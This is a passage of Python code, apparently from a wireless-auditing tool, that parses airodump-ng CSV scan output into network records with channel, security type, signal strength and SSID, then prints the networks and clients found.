        # (10) # IV, (11) LAN IP, (12) ID-length, (13) ESSID, (14) Key
        newNet = WirelessNetwork()
        newNet.macAddr = listEntry[0].strip().lower()
        newNet.firstSeen = parser.parse(listEntry[1])
        newNet.lastSeen = parser.parse(listEntry[2])
        try:
            newNet.channel = int(listEntry[3].strip())
            
            if newNet.channel == -1:
                # Can come back from the file that way.
                newNet.frequency=0
                newNet.channel = 0
            else:
                try:
                    newNet.frequency = WirelessEngine.getFrequencyForChannel(newNet.channel)
                    if newNet.frequency == None:
                        newNet.frequency = 0
                        newNet.channel = 0
                except:
                    newNet.frequency = 0
                    newNet.channel = 0
        except:
            newNet.channel = 0
            
        newNet.security = listEntry[5].strip()
        
        # Naming consistency
        if newNet.security == "OPN":
            newNet.security = "Open"
            
        if len(newNet.security) > 0:
            newNet.security += " " + listEntry[7].strip()
            newNet.security = newNet.security.strip()  # [7] could be just spaces.
        else:
            newNet.security = listEntry[7].strip()
            
        # Naming consistency
        if 'PSK' in newNet.security:
            newNet.security = 'PSK'
        elif 'MGT' in newNet.security:
            newNet.security = "IEEE 802.1X"
            
        newNet.privacy = listEntry[6]
        
        if ("CCMP TKIP" in newNet.privacy):
            newNet.privacy = "CCMP/TKIP"
        
        try:
            newNet.signal = int(listEntry[8])
            if newNet.signal == -1:
                # No signal strength
                newNet.signal = -100
        except:
            newNet.signal = -100
            
        newNet.ssid = WirelessEngine.convertUnknownToString(listEntry[13].strip())
        
        return newNet

if __name__ == '__main__':
    airodumpcsvfile = '/dev/shm/falconairodump-01.csv'
    
    networks, clients = FalconWirelessEngine.parseAiroDumpCSV(airodumpcsvfile)
    
    if networks is not None:
        print('Networks:')
        for curKey in networks.keys():
            print(str(networks[curKey]))
            
            
        if clients is not None:
            print('clients:')
            for curKey in clients.keys():
                print(str(clients[curKey]))
